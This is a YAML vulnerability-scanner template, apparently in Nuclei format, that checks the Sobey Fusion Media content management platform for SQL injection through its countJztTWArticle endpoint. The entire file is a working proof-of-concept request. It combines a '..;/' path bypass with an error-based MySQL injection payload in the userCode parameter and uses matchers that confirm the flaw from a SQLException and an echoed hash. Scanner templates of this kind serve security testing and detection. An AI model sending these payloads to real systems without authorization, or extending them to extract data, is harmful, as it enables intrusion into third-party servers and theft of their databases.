id: poc-yaml-sobey-imcmp-countjzttwarticle-sqli
info:
  name: Sobey Fusion Media Content Management Platform countJztTWArticle SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztTWArticle?siteCode=&token=&userCode=admin&channelId=1&isRenYuan=1&userCode='+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,md5({{t1}})))),0x7e),1709)+AND+'bckN'='bckN HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "Sobey"
        part: body
      - type: word
        words:
          - ".countJztTWArticle"
        part: body
      - type: word
        words:
          - "~{{t2}}~"
        part: body
      - type: word
        words:
          - "java.sql.SQLException"
        part: body
